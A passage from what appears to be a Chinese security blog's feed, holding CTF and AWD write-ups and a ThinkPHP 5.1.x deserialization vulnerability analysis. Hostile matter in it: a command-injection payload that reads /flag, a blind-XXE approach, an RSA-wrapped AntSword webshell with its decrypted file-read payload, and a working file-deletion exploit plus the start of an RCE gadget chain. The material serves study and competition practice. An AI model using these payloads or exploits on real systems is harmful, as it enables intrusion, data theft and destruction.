class="regexp">/../</span>flag</span><br></pre></td></tr></table></figure><p>即可<code>getflag</code></p><h3 id="修补方式-3"><a href="#修补方式-3" class="headerlink" title="修补方式"></a>修补方式</h3><p>注释即可</p><h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210133714.png" alt=""></p><p>在<code>loginCheck.php</code>文件中存在一个XXE，但这里没有回显，得靠加载外部<code>DTD</code>来读取</p><p>这里可以参考这几篇文章</p><p><a href="http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93" target="_blank" rel="noopener">XXE总结</a></p><p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">Blind XXE详解与Google CTF一道题分析</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210134648.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210135343.png" alt=""></p><p>把EXP拿过来改一下部署到自己的VPS然后直接把XMLPOST过去即可</p><p>这里注意要修改<code>Content-Type: Application/xml</code></p><p>但这里比赛期间一直<code>Mysql</code>连接失败导致一直没打不成，最后十分钟<code>Web3</code>重启了，但是没啥用哈哈哈哈</p><h3 id="修补方式-4"><a href="#修补方式-4" class="headerlink" title="修补方式"></a>修补方式</h3><p>注释掉<code>loadXML</code>即可</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次训练赛学到了很多东西，由于换了电脑，那些一键打的脚本都在旧电脑导致没法很爽快的一键打了，不死马不敢用网上的怕被师傅们骑，所以还是挺难受的，但组队的师傅都很强，修的很快，分工明确，没被搅屎，还是挺顺利的</p><p>但比赛完第二天才发现有师傅用了软连接的骚套路</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200210135923.png" alt=""></p><p><strong>使用方式</strong></p><p>ln  -s [源文件或目录] [目标文件或目录]</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /flag /home/ctf/html/css/user.txt</span><br></pre></td></tr></table></figure><p>所以我说明明都修好了，怎么一直在被拿分（笑哭</p><p>所以以后脱下来后，要每隔一段时间重新脱下来或者服务器上寻找是否被弄了软连接</p><p>最后感谢各位师傅，感谢星盟，这次训练赛学到了很多~</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Web1&quot;&gt;&lt;a href=&quot;#Web1&quot; class=&quot;headerlink&quot; title=&quot;Web1&quot;&gt;&lt;/a&gt;Web1&lt;/h1&gt;&lt;h2 id=&quot;任意代码执行&quot;&gt;&lt;a href=&quot;#任意代码执行&quot; class=&quot;headerlink&quot; title=&quot;任意代码执行&quot;&gt;&lt;/a&gt;任意代码执行&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200209232947.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;admin/func.php&lt;/code&gt;内存在函数&lt;code&gt;shell&lt;/code&gt;，存在&lt;code&gt;exec&lt;/code&gt;代码执行，这里由于是前面存在&lt;code&gt;ping&lt;/code&gt;，我们这里直接闭合执行命令即可&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ping 127.0.0.1;cat /flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="AWD" scheme="https://a2u13.com/categories/AWD/"/>
    
    
  </entry>
  
  <entry>
    <title>Misc欢乐签到新春流量题解析</title>
    <link href="https://a2u13.com/2020/02/06/Misc%E6%AC%A2%E4%B9%90%E7%AD%BE%E5%88%B0%E6%96%B0%E6%98%A5%E6%B5%81%E9%87%8F%E9%A2%98%E8%A7%A3%E6%9E%90/"/>
    <id>https://a2u13.com/2020/02/06/Misc%E6%AC%A2%E4%B9%90%E7%AD%BE%E5%88%B0%E6%96%B0%E6%98%A5%E6%B5%81%E9%87%8F%E9%A2%98%E8%A7%A3%E6%9E%90/</id>
    <published>2020-02-06T09:03:19.000Z</published>
    <updated>2020-06-07T06:28:28.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206163110.png" alt=""></p><a id="more"></a><p>打开看到一堆流量包，按常理先进行<code>http</code>数据包筛选</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206163337.png" alt=""></p><p>通过整体分析可知大概流程是先登录，然后上传shell，然后蚁剑链接，所以重点主要放在蚁剑流量分析这一块</p><h1 id="RSA部分"><a href="#RSA部分" class="headerlink" title="RSA部分"></a>RSA部分</h1><p>在追踪<code>No.166</code>号包是可以看到这里对上传了<code>RSA</code>的公钥，以及解密的部分代码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206163628.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = @$_POST[<span class="string">'ant'</span>];</span><br><span class="line">$pk = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwnCJVUy91pah8sun0ZKmRAb8L</span></span><br><span class="line"><span class="number">7</span>D0Yb7Zz717BTH7tX4VRlnTZmbFtbfnBXDu3Qrf/hNY6qSDlgKK9h02RFhyNOAXP</span><br><span class="line">+<span class="number">4</span>Q1msKDSLgNxvjTmPt3+QxhYbbOPzAy7TjJtHrOG5/JQiWyVBZt6FoaEOVi8nQj</span><br><span class="line">INxTYHog0nO6H56OkQIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds = explode(<span class="string">"|"</span>, $cmd);</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$cmd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($cmds <span class="keyword">as</span> $value) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .= $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br></pre></td></tr></table></figure><p>那么这一块我们可以直接拿来进行<code>RSA</code>解密了</p><h1 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206163814.png" alt=""></p><p>那么剩下的这几个数据包就是RSA加密后的数据了，打开其中一个可知</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206163754.png" alt=""></p><p>这里对上边的ant的数据进行<code>RSA</code>解密，这里需要进行<code>urldecode</code>处理</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ant = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">H%2FPRtVEU0jjyN1kcEKv4t5O8DmeaUwTgM8cFZOQ4LVKWwA80NON0iircNRuYIPQcE562vdz3wqfFff%2B2uEIJaG4hZ6G6tLoFV%2FcYumW20WXatWOLSuOs3mEq62p%2BRfrwUOTIl7TJGHOAWwM6mLAroSxmuqqIybmFxBoQPCFsmEc%3D%7Cpo2xxDfBxZxcaxe9C91Z2h7OeAPzASOk38EZNSidXCDwaXTRAJdgeKtfDsSoRu1e9Ezhof%2BzBup1uEF7ZO3AwsOW2UzZpMX%2Bh5gv1mYyavCKirUOgmYeJQpaCakJXrc9S3pYk39IfyjrEq8c8drWhhuvydmVguAoxORd1G6MQnw%3D%7CEHQ0kGm9KKkFSzzgb5xubpL5apoLrIFZgb8%2Bvwrl1BLRcLCAadO1HGPrtflqvO3aEToIkhwz3QLcXgB86%2B6m8h5u%2FZOu3x1L2vtO9jVQM2RMS5kIllRo9oXjuo4bG3dHAAWepwlll5NDJlzWhVQ8J5XNxO9cxW4KxOBhp0dkg8g%3D%7CnYhLM6T1f4G9Pvx75atxxs6hjIw5hADAG68TG0JlUR4VPFn5TCiOKU3psk4I2A%2Fdqm5IGLEs9iXz%2Fl5%2BPoYUJT8Wzi1zWG%2B9429eO36SbHJ6%2B7Y3a9hzshw%2B2GflgHgxN7MnSr6RZm4%2ByqKCTkyLYBwuMtWgBo8WN67%2BIGK7a%2Fs%3D%7CUNmQvKgoaWlQJz87BcRL1IU9lqIAl8iRkdg24DG6Stc3Yfeu%2Fb1owmltJXNaXs3X%2FHildrL7W5o5ZErbqZliS1o8esIEtvIpmM78WdgvyYf%2BjkgBMxA5ErZGSuDnounDj7mVy1sZUQAkZE0%2BqlE9SF%2FNmeYfbPel5IWGpf6A7Do%3D%7CD2SEOtzM4NCOgLs7Pl0Cs7yR0%2FyjO6iiWZ%2FrZkYyKSlC8SNgbw4Udf57Pq7zIAB2C%2BF8VlAnwuvbANdFj3ShlYdduJF5ASVwcs3cS6W6eY54Q1eTj8YJ53iLLV5AYi4Zq9ujmrY2iJfZUByes5uS6sDxL%2BRhy8KN9mfSzkihxhI%3D%7CGNCTU1GI05Zucx%2BFtxmeur35Zz8YeovqGAqOrnrwBqFrVdNOisYo81%2BS3HOIwRpQnIDKM9Rii53ajMRUv0Y6YY9oL29HhZ5krV5pv8crmFuX09%2BiRSuTcS2HbQXeuq4JaOVUroWQ8ORmw0oXw6QR5ElkvK4Y5v6HeL9Xouo52PM%3D%7Ce%2BfvCFHX3owlAm4u5azepN4KEAjLv9STvC8gDOUj4Uu%2Fya549UPF6JBJ34xrcY62u18Y1LaKDGooaC9duKJxpa24hCt1L9EA%2FK%2F%2F6KN5RtnQ55s3RZulDRVLKFH71DtcsQYr6M51M4JanYEBazbP63DGvCvyUaiFi%2BrjELnE92w%3D%7CXO%2FqR119zYzErzFVAt11AKn3deLrvv80pLsP5XIdsYilt6%2BMs2Og9EihuO6WABz0DbLCN18Hmxkvd90lztqYB%2F8BDPXd%2BNuu7kkEJD3tstBpS2aFEums%2B8y%2B7JNxNnxOrHoL3S%2Flhwh2TECVtMioSFv7rBitZ%2FvlC%2B%2BAVp7aPLQ%3D%7CJcy3PY4O9cyp7%2B1Zg72rgebaFO9JL1A2GtawocX25gDClAr%2BjsFANSaTbjemMi2In%2BBAjddZj%2BBllWdX4GbJ564DewlpUI0jfHAZ51XOD74WDHPSzzdAiyJV8iKLt8gJfUWal5XezwVJK2wwQfX1TvLvNnYKqUcchtZYqc4x0lU%3D</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$ant = urldecode($ant);</span><br><span class="line">$pk = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwnCJVUy91pah8sun0ZKmRAb8L</span></span><br><span class="line"><span class="number">7</span>D0Yb7Zz717BTH7tX4VRlnTZmbFtbfnBXDu3Qrf/hNY6qSDlgKK9h02RFhyNOAXP</span><br><span class="line">+<span class="number">4</span>Q1msKDSLgNxvjTmPt3+QxhYbbOPzAy7TjJtHrOG5/JQiWyVBZt6FoaEOVi8nQj</span><br><span class="line">INxTYHog0nO6H56OkQIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds = explode(<span class="string">"|"</span>, $ant);</span><br><span class="line">$pk = openssl_pkey_get_public($pk);</span><br><span class="line">$cmd = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($cmds <span class="keyword">as</span> $value) &#123;</span><br><span class="line"><span class="keyword">if</span> (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">$cmd .= $de;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br></pre></td></tr></table></figure><p>运行之后可以看到具体执行的命令以及命令运行后的结果</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$output=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"25795"</span>;</span><br><span class="line"><span class="keyword">echo</span> @asenc($output);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"c83b3"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $D=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">  @session_start();</span><br><span class="line">  $key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>上面为执行<code>AES</code>加密的流程代码，解密出来是一堆重复代码，这里缩减取出核心代码</p><p>可以看到，大概流程是去session_id的前十六位作为秘钥，如果不足16位则用字母<code>a</code>补全</p><p>而且，最重要一点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">蚁剑的session_id再启动后是不会发生变化的！！</span><br><span class="line">蚁剑的session_id再启动后是不会发生变化的！！</span><br><span class="line">蚁剑的session_id再启动后是不会发生变化的！！</span><br></pre></td></tr></table></figure><p>因此要区分原网页session_id和蚁剑的session_id</p><p>将加密结果base64编码后输出即为加密结果</p><p>这里采用了`AES-128-ECB的方式进行加密，加密结果如下</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="number">25795</span>MWWsTOwCuutFs0GOeIYbUaDFX6cnZ82BZcWLLQB4DaGSeZcOfEIp27QrP2cHWKjOYIZ3JPB0NNshIvWenZclKiQe0zLDRJxfjvF<span class="regexp">/ZqApUMudjNm8SRrIANubX4FwhUKlKtxv8cakZxyO4UVeZ6vx3sEa26q/</span>GPK5YL8B9+Bfz2m97zdD4PBbGkAlDhEysx7HnPADVlNiy8NNCXkBkClIVJd+LWx8MxLM61VNY<span class="regexp">/aPcBABoBJYtisuW/</span>Qnd<span class="regexp">/Tj3e+uc83b3</span></span><br></pre></td></tr></table></figure><p>知道流程后，其余三个同理，这里不再累述，直接拿最后一个数据包进行解密</p><h1 id="flag解密"><a href="#flag解密" class="headerlink" title="flag解密"></a>flag解密</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206165231.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f_start();</span><br><span class="line">$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$output=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a31e3"</span>;</span><br><span class="line"><span class="keyword">echo</span> @a_start();</span><br><span class="line">$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$output=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a31e3"</span>;</span><br><span class="line"><span class="keyword">echo</span> @asenc($output);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"56aa9"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">$F=base64_decode($_POST[<span class="string">"0xdac6ac99b3_start();$key=@substr(str_pad(session_id(),16,'a'),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), 'AES-128-ECB', $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo "</span>a31e3<span class="string">";echo @asenc($output);echo "</span><span class="number">56</span>aa9<span class="string">";&#125;ob_start();try&#123;$F=base64_decode($_POST["</span><span class="number">0xdac6ac99b3e73</span><span class="string">"]);$P=@fopen($F,"</span>r<span class="string">");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose_start();$key=@substr(str_pad(session_id(),16,'a'),0,16);return @base64_encode(openssl_encrypt(base64_encode($out), 'AES-128-ECB', $key, OPENSSL_RAW_DATA));&#125;;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo "</span>a31e3<span class="string">";echo @asenc($output);echo "</span><span class="number">56</span>aa9<span class="string">";&#125;ob_start();try&#123;$F=base64_decode($_POST["</span><span class="number">0xdac6ac99b3e73</span><span class="string">"]);$P=@fopen($F,"</span>r<span class="string">");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);;&#125;catch(Exception $e)&#123;echo "</span>ERROR:<span class="comment">//".$e-&gt;getMessage();&#125;;asoutput();die();</span></span><br></pre></td></tr></table></figure><p>这里得到了session_id，得到了加密结果，直接拿来解密即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = substr(str_pad(<span class="string">"9innpnqeqolh4ogo7f9paabm93"</span>,<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">$inpout = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">KUwmK3042YEA/+V8qWK3XIQeIV7IGgyo2qEJOaHbnp2PfNhT6V1rRyHO0k/P2iOF</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> base64_decode(openssl_decrypt(base64_decode($inpout), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206165352.png" alt=""></p><p>得到flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种题其实不难，根据我做过的很多流量解密题来说，都是套路化，要么登录需要<code>sqlmap</code>注入得数据包内容来获取登录密码，然后使用<code>AES、RSA、DES</code>等做加密处理，最后解得flag</p><p>最主要一点是，他用了什么加密就用什么解密，比如他用了<code>PHP</code>的<code>openssl</code>进行了加密，那么解密就使用<code>openssl</code>解密，不要再百度、谷歌AES解密之类的，会出现无法解密或者解密乱码的问题</p><h1 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h1><p><a href="https://a2u13-pic.oss-accelerate.aliyuncs.com/annex/%E6%96%B0%E6%98%A5%E6%B5%81%E9%87%8F.pcapng" target="_blank" rel="noopener">新春流量.pcapng</a></p><p>在此十分感谢夏风师傅~</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200206163110.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://a2u13.com/categories/Misc/"/>
    
    
      <category term="流量分析" scheme="https://a2u13.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x反序列化漏洞分析</title>
    <link href="https://a2u13.com/2020/01/11/ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://a2u13.com/2020/01/11/ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-01-11T11:09:06.000Z</published>
    <updated>2020-06-07T06:28:28.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>ThinkPHP自版本5以后采用composer安装模块，这里附上安装指令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110213849.png" alt=""></p><p>由于反序列化需要触发点，官方框架里是没有现成的反序列化触发点，我们这里给他构造一个</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110221057.png" alt=""></p><p>设置完毕后在TP根目录下启动服务即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php think run</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><p>由于之前看到过有人过反序列化漏洞本质上还是算是变量覆盖漏洞，反序列化基本的起点、跳板、终点这里就不多讲了</p><p>相关的魔术方法概念以及作用请参考：<br><a href="https://www.jb51.net/article/96167.htm" target="_blank" rel="noopener">https://www.jb51.net/article/96167.htm</a></p><p>反序列化的起点通常是<code>__destruct</code>、<code>__tostring</code>或者<code>__wakeup</code></p><p>这里先全局找一下下<code>__destruct</code>函数，这里推荐使用PHPStorm，全局寻找函数很方便</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110215227.png" alt=""></p><p>这里得一个个看，幸好四个还不是特别多，最终可以找到一个符合的<code>__destruct</code>函数</p><p><code>thinkphp/library/think/process/pipes/Windows.php</code>中的<code>Windows</code>类中的<code>__destruct</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110215748.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进入<code>removeFiles</code>函数瞅瞅</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">      @unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>$this-&gt;files</code>可控，所以这算是一个任意文件删除漏洞了</p><p>EXP可以这么写：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [<span class="string">'/Users/a2u13/Desktop/CodeHack/tp5.1.35/TEST'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>这里新建了一个文件名叫TEST，把EXP的运行结果POST提交过去，就可以删掉这个文件了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110221352.png" alt=""></p><h2 id="反序列化RCE漏洞"><a href="#反序列化RCE漏洞" class="headerlink" title="反序列化RCE漏洞"></a>反序列化RCE漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">      @unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中file_exist函数中传入参数为字符串形式，这里考虑可以使用<code>__tostring</code>来作为跳板使用</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207193940.png" alt=""></p><p>所以全局搜一下下<code>__tostring</code>函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110222004.png" alt=""></p><p>在\think\model\concern\Conversion下找到一个<code>__tostring</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进toJson函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进toArray函数</p><p>这里需要寻找到一个可控变量来引用其方法，这样的话才可以触发其他类的<code>__call</code>方法（因为在其他类中这个方法不可访问或者无权访问，此时会调用<code>__call</code>进行错误监视处理</p><p>这里代码虽然有点多，但大致可以分成四块来看，以每个foreach循环来划分</p><p>其中第一二个foreach循环中不存在变量-&gt;方法引用</p><p>在三个块中可以看到存在诸多变量-&gt;方法引用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">$val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">$item[$key] = $val-&gt;toArray();</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">$item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">$relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure><p>寻找到一个一个变量和参数均可控的方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">      <span class="comment">// 追加关联对象属性</span></span><br><span class="line">      $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">        $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">        <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">          $relation-&gt;visible($name);</span><br><span class="line">        &#125;</span><br><span 